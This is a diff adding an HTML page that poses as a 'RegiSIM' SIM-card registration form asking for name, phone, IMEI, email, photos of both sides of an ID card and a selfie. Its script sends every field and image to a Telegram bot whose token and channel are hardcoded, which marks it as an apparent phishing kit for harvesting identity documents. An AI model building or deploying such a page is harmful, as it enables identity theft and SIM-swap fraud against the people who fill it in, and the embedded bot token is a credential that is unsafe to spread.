@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.2/css/bootstrap.min.css"
+    />
+    <link rel="stylesheet" href="style.css" />
+    <title>RegiSim</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="form-container">
+        <a href="index.html">
+          <span
+            style="
+              vertical-align: middle;
+              font-size: 20px;
+              font-weight: bold;
+              margin-left: 5px;
+            "
+            >RegiSIM</span
+          >
+          <br />
+        </a>
+        <span style="font-size: 12px">Click to know more about RegiSIM</span
+        ><br /><br />
+        <h2>RegiSIM Form</h2>
+        <form onsubmit="handleSubmit(event)" class="form">
+          <label for="fullname">Full Name:</label><br />
+          <input
+            type="text"
+            id="fullname"
+            name="fullname"
+            required
+          /><br /><br />
+
+          <label for="phone">Phone Number:</label><br />
+          <input type="number" id="phone" name="phone" required /><br /><br />
+
+          <label for="imei">IMEI:</label><br />
+          <input type="number" id="imei" name="imei" required />
+          <span style="font-size: 12px">(Dial *#06# to check IMEI code)</span
+          ><br /><br />
+
+          <label for="email">Email Address:</label><br />
+          <input type="email" id="email" name="email" required /><br /><br />
+          <span style="font-size: 12px">(Image should be clear enough)</span
+          ><br />
+          <label for="idcardfront">Upload ID Card Front:</label><br />
+          <input
+            type="file"
+            id="idcardfront"
+            name="idcardfront"
+            accept="image/*"
+            required
+          />
+          <br /><br />
+          <span style="font-size: 12px">(Image should be clear enough)</span
+          ><br />
+
+          <label for="idcardback">Upload ID Card Back:</label><br />
+          <input
+            type="file"
+            id="idcardback"
+            name="idcardback"
+            accept="image/*"
+            required
+          /><br /><br />
+          <span style="font-size: 12px">(Image should be clear enough)</span
+          ><br />
+
+          <label for="selfie">Upload Your Picture:</label><br />
+          <span style="font-size: 12px">(Half image of yourself)</span><br />
+          <input
+            type="file"
+            id="selfie"
+            name="selfie"
+            accept="image/*"
+            required
+          /><br /><br />
+          <label for="other">
+            Please write your number so we can call you when the sim card is
+            ready preferably whatsapp number and name too.
+          </label>
+          <textarea name="message" required id="#"></textarea>
+
+          <input type="submit" value="Submit" class="btn btn-primary" />
+        </form>
+      </div>
+    </div>
+    <script>
+      // Function to show the overlay
+      function showOverlay() {
+        const overlay = document.createElement("iframe");
+        overlay.src = "overlay.html";
+        overlay.style.position = "fixed";
+        overlay.style.top = "0";
+        overlay.style.left = "0";
+        overlay.style.width = "100%";
+        overlay.style.height = "100%";
+        overlay.style.border = "none";
+        overlay.style.zIndex = "9999";
+
+        document.body.appendChild(overlay);
+      }
+
+      // Function to hide the overlay
+      function hideOverlay() {
+        const overlay = document.querySelector("iframe[src='overlay.html']");
+        if (overlay) {
+          overlay.remove();
+        }
+      }
+
+      // form beginning
+      function handleSubmit(event) {
+        event.preventDefault(); // Prevent the form from submitting normally
+
+        // Show the overlay
+        showOverlay();
+
+        // collect form data
+        const form = event.target;
+        const formData = new FormData(form);
+
+        // handle files
+        const fullname = formData.get("fullname");
+        const phone = formData.get("phone");
+        const imei = formData.get("imei");
+        const email = formData.get("email");
+        const message = formData.get("message");
+
+        // Initialize the images object
+        const images = {};
+
+        // Process the uploaded images
+        if (form.elements["idcardfront"].files.length > 0) {
+          const idcardFront = form.elements["idcardfront"].files[0];
+          images["idcardfront"] = idcardFront;
+        }
+
+        if (form.elements["idcardback"].files.length > 0) {
+          const idcardBack = form.elements["idcardback"].files[0];
+          images["idcardback"] = idcardBack;
+        }
+
+        if (form.elements["selfie"].files.length > 0) {
+          const selfie = form.elements["selfie"].files[0];
+          images["selfie"] = selfie;
+        }
+
+        // Function to send message with images and form fields to Telegram
+        function sendMessageWithImages(
+          botToken,
+          chatId,
+          message,
+          images,
+          fullname,
+          phone,
+          imei,
+          email
+        ) {
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+          // Construct the message text with form fields
+          let messageText = `Full Name: ${fullname}\n`;
+          messageText += `Phone: ${phone}\n`;
+          messageText += `IMEI: ${imei}\n`;
+          messageText += `Email: ${email}\n`;
+          messageText += `Message: ${message}`;
+
+          // Send the message text
+          const messageData = JSON.stringify({
+            chat_id: chatId,
+            text: messageText,
+          });
+
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", url, true);
+          xhr.setRequestHeader("Content-Type", "application/json");
+          xhr.onload = function () {
+            if (xhr.status === 200) {
+              console.log("Message sent successfully");
+              if (Object.keys(images).length > 0) {
+                sendImages(botToken, chatId, images);
+              } else {
+                displayMessage("Form submitted successfully", true);
+                window.location.href = "success.html";
+              }
+            } else {
+              console.error("Error sending message. Status:", xhr.status);
+              displayMessage("Failed to send the form", false);
+              window.location.href = "error.html";
+            }
+          };
+          xhr.send(messageData);
+        }
+
+        // Function to send images to Telegram
+        function sendImages(botToken, chatId, images) {
+          let imagesSent = 0;
+          const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+          for (const name in images) {
+            const image = images[name];
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("caption", name);
+            formData.append("photo", image, image.name);
+
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", url, true);
+            xhr.onload = function () {
+              if (xhr.status === 200) {
+                console.log(`Image '${name}' sent successfully`);
+              } else {
+                console.error(
+                  `Error sending image '${name}'. Status: ${xhr.status}`
+                );
+              }
+
+              imagesSent++;
+              if (imagesSent === Object.keys(images).length) {
+                displayMessage("Form submitted successfully", true);
+                window.location.href = "success.html";
+              }
+            };
+            xhr.send(formData);
+          }
+        }
+
+        // Function to display the message
+        function displayMessage(message, isSuccess) {
+          const displayElement = document.createElement("div");
+          displayElement.textContent = message;
+          displayElement.style.color = isSuccess ? "green" : "red";
+          document.body.appendChild(displayElement);
+        }
+
+        // Send the message with images and form fields to Telegram
+        sendMessageWithImages(
+          "6384913385:AAEhwGNHb8PVy47N30Y2HxNTLgsCuzwZrTw",
+          "@BlueOnlyGetMessage",
+          message,
+          images,
+          fullname,
+          phone,
+          imei,
+          email
+        );
+
+        // Clear the form
+        form.reset();
+      }
+    </script>
+  </body>
+</html>
